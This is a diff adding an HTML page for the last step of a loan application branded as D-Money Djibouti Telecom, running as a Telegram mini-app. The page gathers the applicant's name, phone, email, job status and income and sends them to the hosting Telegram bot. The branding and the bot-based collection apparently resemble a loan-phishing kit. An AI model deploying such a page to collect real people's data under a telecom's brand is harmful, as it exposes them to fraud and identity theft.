@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>D-Money - Résumé de la Demande</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root { --dmoney-yellow: #ffcc00; --dmoney-dark: #111111; --bg-color: #f7f9fa; --card-bg: #ffffff; --input-border: #e2e8f0; }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .app-header { width: 100%; background-color: var(--dmoney-dark); height: 65px; padding: 0 20px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
+        .back-btn-top { color: white; text-decoration: none; font-weight: 600; font-size: 15px; cursor: pointer; display: flex; align-items: center; gap: 5px; }
+        .header-title { position: absolute; left: 50%; transform: translateX(-50%); display: flex; font-size: 20px; font-weight: 800; color: white; }
+        .header-title .d-part { color: var(--dmoney-yellow); margin-right: 2px; }
+        .menu-icon { font-size: 24px; cursor: pointer; color: white; display: flex; flex-direction: column; gap: 5px; }
+        .menu-icon span { display: block; width: 22px; height: 3px; background-color: var(--dmoney-yellow); border-radius: 2px; }
+        .card { background: white; width: 90%; max-width: 440px; margin: 20px 0 30px; padding: 32px 24px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); border: 1px solid #edf2f7; display: flex; flex-direction: column; }
+        .main-title { font-size: 26px; color: var(--dmoney-dark); margin: 0 0 6px; text-align: center; font-weight: 800; }
+        .subtext { font-size: 14px; color: #777777; text-align: center; margin-bottom: 20px; }
+        .step-indicator { display: flex; gap: 12px; margin: 0 auto 32px; width: 80%; }
+        .step-bar { flex: 1; height: 4px; background-color: #e2e8f0; border-radius: 2px; }
+        .step-bar.active { background-color: var(--dmoney-yellow); }
+        .form-group { margin-bottom: 22px; display: flex; flex-direction: column; }
+        .form-group label { font-size: 15px; font-weight: 700; color: #222222; margin-bottom: 10px; }
+        .form-control { font-size: 15px; padding: 14px 16px; border: 1px solid var(--input-border); border-radius: 10px; background-color: #ffffff; color: #333333; outline: none; width: 100%; }
+        .form-control:focus { border-color: #d97706; }
+        .summary-card { background-color: #fffdf4; border-left: 4px solid var(--dmoney-yellow); padding: 18px 16px; border-radius: 10px; margin: 10px 0 24px; border: 1px solid #fef3c7; }
+        .summary-card h3 { margin: 0 0 14px 0; font-size: 16px; font-weight: 800; color: var(--dmoney-dark); }
+        .summary-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; padding-bottom: 8px; border-bottom: 1px solid #fef3c7; }
+        .summary-label { color: #666666; font-size: 13.5px; font-weight: 500; }
+        .summary-value { font-weight: 700; font-size: 13.5px; color: #111111; text-align: right; }
+        .btn-container { display: flex; flex-direction: column; gap: 12px; margin-top: 10px; }
+        .btn-prev { background-color: #e8e8e8; color: #555555; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 15px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
+        .btn-next { background-color: var(--dmoney-yellow); color: var(--dmoney-dark); border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 15px; font-weight: 800; cursor: pointer; text-transform: uppercase; box-shadow: 0 4px 12px rgba(255, 204, 0, 0.25); }
+        .footer-banner { width: 100%; text-align: center; padding: 20px; font-size: 12px; color: #666666; margin-top: auto; }
+    </style>
+</head>
+<body>
+<div class="app-header">
+    <a onclick="goBack()" class="back-btn-top">← Retour</a>
+    <div class="header-title"><span class="d-part">D</span>-Money</div>
+    <div class="menu-icon"><span></span><span></span><span></span></div>
+</div>
+
+<div class="card">
+    <h1 class="main-title">Demande de Prêt</h1>
+    <div class="subtext">Étape 3 sur 3</div>
+    <div class="step-indicator">
+        <div class="step-bar active"></div><div class="step-bar active"></div><div class="step-bar active"></div>
+    </div>
+
+    <form id="step3Form" onsubmit="submitForm(event)">
+        <div class="form-group">
+            <label for="jobStatus">Statut Professionnel</label>
+            <select id="jobStatus" class="form-control" required>
+                <option value="Employé" selected>Employé(e)</option>
+                <option value="Entrepreneur / Commerçant">Entrepreneur / Commerçant</option>
+                <option value="Fonctionnaire">Fonctionnaire</option>
+                <option value="Étudiant">Étudiant(e)</option>
+                <option value="Sans emploi">Sans emploi</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <label for="income">Revenu Mensuel Moyen (DJF)</label>
+            <input type="number" id="income" class="form-control" placeholder="Ex: 150000" required>
+        </div>
+
+        <div class="summary-card">
+            <h3>Résumé de la Demande</h3>
+            <div class="summary-row"><span class="summary-label">Montant du Prêt :</span><span class="summary-value" id="sumAmount">--</span></div>
+            <div class="summary-row"><span class="summary-label">Durée du Prêt :</span><span class="summary-value" id="sumDuration">--</span></div>
+            <div class="summary-row"><span class="summary-label">Objet du Prêt :</span><span class="summary-value" id="sumPurpose">--</span></div>
+            <div class="summary-row"><span class="summary-label">Demandeur :</span><span class="summary-value" id="sumName">--</span></div>
+            <div class="summary-row"><span class="summary-label">Téléphone :</span><span class="summary-value" id="sumPhone">--</span></div>
+        </div>
+
+        <div class="btn-container">
+            <button type="button" class="btn-prev" onclick="goBack()">PRÉCÉDENT</button>
+            <button type="submit" class="btn-next">SOUMETTRE LA DEMANDE</button>
+        </div>
+    </form>
+</div>
+<div class="footer-banner">© 2026 D-Money Djibouti Telecom</div>
+
+<script>
+window.onload = () => {
+    const tg = window.Telegram?.WebApp;
+    if (tg) { tg.ready(); tg.expand(); }
+
+    const amount = localStorage.getItem('appliedAmount') || localStorage.getItem('amount');
+    const term = localStorage.getItem('appliedTerm');
+    const purpose = localStorage.getItem('appliedPurpose');
+    const fName = localStorage.getItem('firstName') || "";
+    const lName = localStorage.getItem('lastName') || "";
+    const phone = localStorage.getItem('phone') || "";
+
+    if (amount) {
+        document.getElementById('sumAmount').innerText = `${Number(amount).toLocaleString('fr-FR')} DJF`;
+    }
+    document.getElementById('sumDuration').innerText = term ? `${term} Mois` : "--";
+    document.getElementById('sumPurpose').innerText = purpose ? purpose : "--";
+    document.getElementById('sumName').innerText = `${fName} ${lName}`.trim() || "--";
+    document.getElementById('sumPhone').innerText = phone ? `+253 ${phone}` : "--";
+};
+
+function submitForm(event) {
+    event.preventDefault();
+    const tg = window.Telegram?.WebApp;
+    const incomeVal = document.getElementById('income').value.trim();
+
+    if (!incomeVal) { alert("Veuillez indiquer votre revenu."); return; }
+
+    const data = {
+        amount: localStorage.getItem('appliedAmount'),
+        duration: localStorage.getItem('appliedTerm'),
+        purpose: localStorage.getItem('appliedPurpose'),
+        firstName: localStorage.getItem('firstName'),
+        lastName: localStorage.getItem('lastName'),
+        email: localStorage.getItem('email'),
+        phone: localStorage.getItem('phone'),
+        jobStatus: document.getElementById('jobStatus').value,
+        income: incomeVal,
+        currency: "DJF"
+    };
+
+    localStorage.setItem('jobStatus', data.jobStatus);
+    localStorage.setItem('income', incomeVal);
+
+    if (tg && tg.sendData) {
+        tg.sendData(JSON.stringify(data));
+        setTimeout(() => { window.location.href = "/page5"; }, 300);
+    } else {
+        window.location.href = "/page5";
+    }
+}
+
+function goBack() { window.location.href = "/page3"; }
+</script>
+</body>
+</html>
